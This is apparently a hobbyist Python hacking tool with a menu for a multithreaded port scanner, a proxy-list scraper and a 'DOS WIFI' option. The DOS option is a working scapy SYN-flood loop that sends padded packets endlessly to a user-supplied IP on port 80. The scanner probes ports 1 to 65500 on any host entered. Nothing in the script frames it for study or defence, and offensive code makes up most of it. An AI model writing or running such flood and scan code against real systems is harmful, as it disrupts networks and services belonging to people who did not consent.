import menufather
import colorama
import time
from scapy.all import *
import threading
import requests
from bs4 import BeautifulSoup
import socket

tite = "𝖈𝖑𝖔𝖜𝖓"
bot = ["1-PORT SCANNER","2-PROXY","3-DOS WIFI","4-EXIT"]
menu = menufather.Menu(title=tite,items=bot)

menu.show()
while True:
    time.sleep(0.1)
    select = menu.get_selected_item()
    if select==2:
        target_ip = input("enter target ip (WIFI IP):")
        target_port= 80
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort() , dport=target_port, flags="S")
        raw = Raw(b"X" * 1024)
        packet = ip / tcp / raw
        send(packet, loop = 1,verbose = 0)
    if select ==0:
       
        ipaddr = input("enter ip addres for check port: ")
        def port_scann(port):
            host = ipaddr
            host_ip = socket.gethostbyname(host)
            statuse = False
            s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
            try:
                s.connect((host_ip , port))
                statuse = True
            except :
                statuse = False
            if statuse:
                print("open port tcp:{}".format(port))
        for i in range(1,65500):
            therad = threading.Thread(target=port_scann, args=[i])
            therad.start()
    if select == 1:
        x = "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1"
        m = requests.get(x)
        soup = BeautifulSoup(m.text, 'html.parser')
        print(soup.text)
    if select == 3:
        print(colorama.Fore.RED+"THANK YOU FOR USING MY TOOL:)")
        break
